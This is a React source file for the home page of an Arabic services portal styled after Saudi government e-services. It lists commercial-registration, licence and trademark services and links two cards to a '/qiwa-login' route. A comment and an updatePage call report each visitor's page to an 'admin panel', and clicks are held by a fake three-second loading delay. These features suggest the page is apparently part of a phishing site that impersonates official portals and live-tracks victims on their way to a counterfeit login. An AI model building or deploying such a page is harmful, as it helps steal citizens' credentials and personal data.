import Header from "@/components/layout/Header";
import Footer from "@/components/layout/Footer";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { FileText, Plus, Search, Settings, User } from "lucide-react";
import { useLocation } from "wouter";
import { useState, useEffect } from "react";
import { Loader2 } from "lucide-react";
import { updatePage } from "@/lib/store";

export default function HomeNew() {
  const [, setLocation] = useLocation();
  const [loadingService, setLoadingService] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState("");

  // Update page name in admin panel
  useEffect(() => {
    updatePage("الصفحة الرئيسية");
  }, []);

  const services = [
    
    { name: "قيد سجل تجاري", desc: "إصدار سجل تجاري جديد لمؤسسة فردية", icon: "🏢", link: "/service/new-cr" },
    { name: "تجديد سجل تجاري", desc: "تجديد صلاحية السجل التجاري القائم", icon: "🔄", link: "/service/renew-cr" },
    { name: "حجز اسم تجاري", desc: "حجز اسم تجاري جديد قبل إصدار السجل", icon: "abc", link: "/service/reserve-name" },
    { name: "تعديل سجل تجاري", desc: "تعديل بيانات السجل التجاري الحالي", icon: "✏️", link: "/service/edit-cr" },
    { name: "مستخرج سجل تجاري / الإفادة التجارية", desc: "الحصول على مستخرج رسمي لبيانات السجل التجاري", icon: "📄", link: "/service/commercial-extract" },
    { name: "إصدار رخصة تجارية", desc: "إصدار رخصة لمزاولة النشاط التجاري", icon: "📜", link: "/service/issue-license" },
    { name: "تجديد رخصة تجارية", desc: "تجديد صلاحية الرخصة التجارية المنتهية", icon: "🔄", link: "/service/renew-license" },
    { name: "تسجيل علامة تجارية", desc: "تسجيل وحماية العلامة التجارية الخاصة بك", icon: "®️", link: "/service/register-trademark" },
    { name: "تجديد رخص العمل", desc: "تجديد رخص العمل للعمالة الوافدة", icon: "👷", link: "/qiwa-login?service=تجديد رخص العمل" },
    { name: "توثيق العقود", desc: "توثيق العقود التجارية والإلكترونية", icon: "📝", link: "/qiwa-login?service=توثيق العقود" },

  ];

  const filteredServices = services.filter(service => 
    service.name.includes(searchQuery) || service.desc.includes(searchQuery)
  );

  const handleServiceClick = (link: string | undefined, name: string) => {
    if (!link) return;
    setLoadingService(name);
    setTimeout(() => {
      setLocation(link);
      setLoadingService(null);
    }, 3000);
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50 font-sans" dir="rtl">
      <Header searchQuery={searchQuery} setSearchQuery={setSearchQuery} />
      
      <main className="flex-1 container py-8">
        {/* Welcome Section */}
        <div className="bg-white rounded-lg shadow-sm p-8 mb-8 border border-gray-100">
          <div className="flex justify-between items-center">
            <div>
              <h1 className="text-2xl font-bold text-[#006C35] mb-2">مرحباً بك في بوابة الخدمات</h1>
              <p className="text-gray-600">يمكنك الآن الوصول إلى جميع الخدمات الحكومية وإدارة طلباتك بسهولة.</p>
            </div>

          </div>
        </div>



        {/* Services Cards */}
        <div>
          <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 mb-6">
            <div className="flex items-center gap-4 w-full md:w-auto">
              <h2 className="text-xl font-extrabold text-gray-900">الخدمات المتاحة</h2>
              <span className="bg-[#e6f4ea] text-[#006C35] text-xs font-bold px-3 py-1 rounded-md whitespace-nowrap">الاكثر استخداما</span>
            </div>
            <div className="relative w-full md:w-64 hidden md:block">
              <Search className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
              <input 
                type="text" 
                placeholder="بحث في الخدمات..." 
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="w-full pr-10 pl-4 py-2 border border-gray-200 rounded-md text-sm focus:outline-none focus:border-[#006C35] bg-white"
              />
            </div>
          </div>
          
          <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
            {filteredServices.map((service, i) => (
              <div 
                key={i} 
                onClick={() => handleServiceClick(service.link, service.name)}
                className="group relative bg-white rounded-xl border border-gray-200 p-6 pb-8 flex flex-col items-center justify-center text-center cursor-pointer transition-all duration-300 hover:shadow-lg hover:border-[#006C35]/30 hover:-translate-y-1 min-h-[240px]"
              >
                {/* Icon */}
                <div className="w-20 h-20 flex items-center justify-center mb-4">
                    <svg className="w-16 h-16" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
                      {service.link === '/service/new-cr' && (
                        <>
                          <rect x="18" y="10" width="44" height="56" rx="3" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <line x1="28" y1="24" x2="52" y2="24" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="28" y1="32" x2="52" y2="32" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="28" y1="40" x2="44" y2="40" stroke="#2A8B6E" strokeWidth="2" />
                          <circle cx="56" cy="54" r="10" stroke="#E8772E" strokeWidth="2" fill="none" />
                          <line x1="52" y1="54" x2="60" y2="54" stroke="#E8772E" strokeWidth="2" />
                          <line x1="56" y1="50" x2="56" y2="58" stroke="#E8772E" strokeWidth="2" />
                        </>
                      )}
                      {service.link === '/service/renew-cr' && (
                        <>
                          <rect x="18" y="10" width="44" height="56" rx="3" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <line x1="28" y1="24" x2="52" y2="24" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="28" y1="32" x2="52" y2="32" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="28" y1="40" x2="44" y2="40" stroke="#2A8B6E" strokeWidth="2" />
                          <path d="M50 50 A8 8 0 1 1 58 58" stroke="#E8772E" strokeWidth="2" fill="none" />
                          <polyline points="58,52 58,58 52,58" stroke="#E8772E" strokeWidth="2" fill="none" />
                        </>
                      )}
                      {service.link === '/service/reserve-name' && (
                        <>
                          <rect x="18" y="14" width="44" height="52" rx="3" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <text x="40" y="48" textAnchor="middle" fontSize="22" fontWeight="bold" fill="#2A8B6E" fontFamily="serif">abc</text>
                          <circle cx="56" cy="22" r="8" stroke="#E8772E" strokeWidth="2" fill="none" />
                          <circle cx="56" cy="22" r="2" fill="#E8772E" />
                          <line x1="53" y1="22" x2="59" y2="22" stroke="#E8772E" strokeWidth="1.5" />
                        </>
                      )}
                      {service.link === '/service/edit-cr' && (
                        <>
                          <rect x="18" y="10" width="44" height="56" rx="3" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <line x1="28" y1="24" x2="52" y2="24" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="28" y1="32" x2="52" y2="32" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="28" y1="40" x2="44" y2="40" stroke="#2A8B6E" strokeWidth="2" />
                          <path d="M54 44 L62 52 L58 56 L50 48 Z" stroke="#E8772E" strokeWidth="2" fill="none" />
                          <line x1="62" y1="52" x2="58" y2="56" stroke="#E8772E" strokeWidth="2" />
                        </>
                      )}
                      {service.link === '/service/commercial-extract' && (
                        <>
                          <rect x="18" y="10" width="44" height="56" rx="3" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <line x1="28" y1="24" x2="52" y2="24" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="28" y1="32" x2="52" y2="32" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="28" y1="40" x2="52" y2="40" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="28" y1="48" x2="44" y2="48" stroke="#2A8B6E" strokeWidth="2" />
                          <rect x="46" y="50" width="16" height="12" rx="2" stroke="#E8772E" strokeWidth="2" fill="none" />
                          <line x1="49" y1="56" x2="59" y2="56" stroke="#E8772E" strokeWidth="1.5" />
                        </>
                      )}
                      {service.link === '/service/issue-license' && (
                        <>
                          <rect x="20" y="12" width="40" height="52" rx="3" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <circle cx="40" cy="26" r="6" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <line x1="40" y1="32" x2="40" y2="38" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="30" y1="44" x2="50" y2="44" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="30" y1="50" x2="50" y2="50" stroke="#2A8B6E" strokeWidth="2" />
                          <path d="M52 56 L60 48" stroke="#E8772E" strokeWidth="2" />
                          <circle cx="60" cy="48" r="4" stroke="#E8772E" strokeWidth="2" fill="none" />
                        </>
                      )}
                      {service.link === '/service/renew-license' && (
                        <>
                          <rect x="20" y="12" width="40" height="52" rx="3" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <circle cx="40" cy="26" r="6" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <line x1="40" y1="32" x2="40" y2="38" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="30" y1="44" x2="50" y2="44" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="30" y1="50" x2="50" y2="50" stroke="#2A8B6E" strokeWidth="2" />
                          <path d="M52 52 A7 7 0 1 1 59 59" stroke="#E8772E" strokeWidth="2" fill="none" />
                          <polyline points="59,53 59,59 53,59" stroke="#E8772E" strokeWidth="2" fill="none" />
                        </>
                      )}
                      {service.link === '/service/register-trademark' && (
                        <>
                          <circle cx="40" cy="38" r="22" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <text x="40" y="46" textAnchor="middle" fontSize="28" fontWeight="bold" fill="#2A8B6E" fontFamily="serif">®</text>
                          <circle cx="56" cy="20" r="8" stroke="#E8772E" strokeWidth="2" fill="none" />
                          <polyline points="53,20 55,22 59,18" stroke="#E8772E" strokeWidth="2" fill="none" />
                        </>
                      )}
                      {service.name === 'تجديد رخص العمل' && (
                        <>
                          <rect x="22" y="14" width="36" height="48" rx="3" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <circle cx="40" cy="28" r="8" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <path d="M28 42 C28 36 52 36 52 42" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <line x1="28" y1="50" x2="52" y2="50" stroke="#2A8B6E" strokeWidth="2" />
                          <circle cx="56" cy="18" r="8" stroke="#E8772E" strokeWidth="2" fill="none" />
                          <path d="M52,18 L56,18 M56,14 L56,22" stroke="#E8772E" strokeWidth="2" />
                        </>
                      )}
                      {service.name === 'توثيق العقود' && (
                        <>
                          <rect x="16" y="12" width="34" height="46" rx="3" stroke="#2A8B6E" strokeWidth="2" fill="none" />
                          <line x1="24" y1="24" x2="42" y2="24" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="24" y1="32" x2="42" y2="32" stroke="#2A8B6E" strokeWidth="2" />
                          <line x1="24" y1="40" x2="36" y2="40" stroke="#2A8B6E" strokeWidth="2" />
                          <path d="M44 46 L50 52 L62 38" stroke="#E8772E" strokeWidth="3" fill="none" strokeLinecap="round" strokeLinejoin="round" />
                          <circle cx="53" cy="44" r="14" stroke="#E8772E" strokeWidth="2" fill="none" />
                        </>
                      )}
                    </svg>
                </div>
                
                {/* Service Name */}
                <h3 className="font-bold text-gray-800 text-sm md:text-base leading-relaxed mb-3">{service.name}</h3>
                
                {/* Hover Button */}
                <div className={`transition-all duration-300 w-[85%] mt-auto ${loadingService === service.name ? 'opacity-100' : 'opacity-0 group-hover:opacity-100'}`}>
                  <button className="w-full bg-[#D4621A] text-white font-bold py-2.5 px-4 rounded-full text-sm shadow-md hover:bg-[#C05515] hover:shadow-lg transition-all">
                    {loadingService === service.name ? (
                      <span className="flex items-center justify-center gap-2">
                        <Loader2 className="w-4 h-4 animate-spin" />
                        جاري التحميل...
                      </span>
                    ) : (
                      "الحصول على الخدمة"
                    )}
                  </button>
                </div>
              </div>
            ))}
          </div>
        </div>
      </main>
      
      <Footer />
    </div>
  );
}
